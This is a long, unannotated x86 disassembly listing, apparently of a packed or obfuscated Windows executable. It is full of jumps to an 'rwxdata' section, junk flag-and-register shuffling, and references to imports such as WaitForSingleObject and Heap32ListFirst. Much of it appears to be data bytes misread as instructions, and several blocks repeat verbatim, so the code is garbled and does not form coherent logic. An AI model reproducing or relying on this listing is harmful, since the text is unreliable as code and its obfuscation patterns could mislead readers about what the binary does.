add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_516054
lea esp [ esp + 0xc ]
je rwxdata
shr bh cl
shl bx cl
push eax
mov bx [ esi ]
pushad
pushad
lea esp [ esp + 0x40 ]
jmp rwxdata
pushad
jmp rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
mov ebx [ esi ]
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_5160c0
call sub_517f46
add [ eax ] al
inc edi
je rwxdata
inc ecx
jmp sub_516182
jb rwxdata
xor eax 0xd5e1e6d
bound esi [ eax ]
in al dx
aam 0x62
out 0x75 eax
jbe rwxdata
add [ esi + 0x35 ] cl
push esp
jns rwxdata
fisub [ edx - 0x34 ]
push esp
inc esp
fiadd [ edx + 0x48de85e6 ]

inc ecx
add [ eax ] al
add [ ebx + 0x72 ] al
popad
je rwxdata
inc esp
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
xchg edx eax
imul eax esi 0x42
mov bh cl
mov edi edi
jo rwxdata
add cl ch
dec ecx
popfd
sti
[ ebx + ecx * 4 + 0xf142474 ]
mov esi 0x246c8be9
sbb [ eax + 0x6 ] ch
adc [ esi ] ch
push 0xffffff9c
push 0x3f55786f
push [ esp ]
push [ esp + 0x2c ]
retn 0x30
insd
push ds
pop esi
or eax 0xd4ec3062
sbb eax 0x354e0046
sub_516298
add edi 0x4
pushfd
push 0xfcc1884
lea esp [ esp + 0x10 ]
jmp rwxdata
and ax 0xc628
mov eax [ esi ]
call sub_4cce3d
add [ eax ] al
je rwxdata
xchg edx eax
outsb
jbe __export_name_ptr_table_6(MSVCRT:fread)
fcomp st5
cmp ah dl
shl [ edx ] 0x32
pop ebx
sar [ ecx ] 0x8b
cmp cl [ eax + 0x52 ]
pushfd
push ds
in al 0x91
add al [ ecx + 0x6903aa04 ]
je rwxdata
out dx eax
lds ebp [ edi - 0x1b ]
stosb [ edi ]
add [ eax ] al
jb rwxdata
lea esp [ esp + 0x40 ]
je rwxdata
call [ edx + 0x20dcd647 ]
test eax 0xd91fd01b
in eax 0xf
dec esp
rwxdata
cmp eax 0x1daf4dff
aam 0xfc
jle rwxdata
pushad
int 0x3f
mov eax [ 0xffffffffa6f044bd ]
mov [ edx + esi * 2 + 0x7a83c48 ] dl
xor bh 0x4f
loope rwxdata
fst [ edi + 0x62e84ddc ]
in eax dx
imul ebx eax 0x58e08daa
0x36aea64c 0x630c
outsd
in eax 0xaa
popad
add [ fs : eax ] al
add [ esi + 0x70 ] ah
jne rwxdata
jmp rwxdata
clc
clc
pushfd
mov [ ebp - 0x8 ] eax
lea esp [ esp + 0x4 ]
xchg edi eax
or ebx ebx
loop rwxdata
or eax 0x921fe299
dec ebx
push edi
and eax 0x4668d656
0xc05b
loopne rwxdata
dec ebp
pop eax
int 0x78
out 0x54 eax
fiadd [ ebx + 0x4687b914 ]
pop eax
inc ebp
dec edx
sbb al 0x46
mov al [ 0xffffffffcd60a952 ]
aas
xchg ecx eax
xchg edi eax
or eax [ eax + 0x67 ]
or dh ch
jae rwxdata
bswap ax
movsx ax bl
mov eax 0x1
pushfd
pushfd
push [ esp ]
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
mov al [ 0x400b9791 ]
or dh ch
fsubr [ edx - 0x65a71f73 ]
dec esp
cmpsb [ esi ] [ edi ]
scasb [ edi ]
or al 0x63
dec ecx
fnsave [ edx + 0x1e8435bb ]
popfd
or eax [ ecx + 0x48 ]
hlt
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
call sub_516af7
sub_5162c5
mov [ esp + 0x4 ] 0x4f
mov [ esp ] bl
call sub_517961
lea esp [ esp + 0x20 ]
je rwxdata
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
seto bl
and ecx ecx
shr di cl
mov ecx [ esi + 0x4 ]
setne bh
test ch ch
rol bh cl
sub ecx 0x8
xadd di bx
movzx di bl
shr ecx 0x1
clc
bswap bx
jmp rwxdata
jmp rwxdata
mov edi [ esi ]
bts bx cx
dec bl
bsr bx cx
add edi [ ebp - 0x4 ]
bsr bx ax
add esi 0x8
jmp rwxdata
mov bx [ esi ]
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
cli
stc
dec edi
loopne rwxdata
jb rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
jb rwxdata
salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
push 0x7ec010a8
sub_516390
push 0x393d8d24
lea esp [ esp + 0xc ]
jae rwxdata
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
cmp cl dl
clc
call sub_517bfe
add [ eax ] al
je rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
insb
outsd
ja rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
push 0xb6c0279e
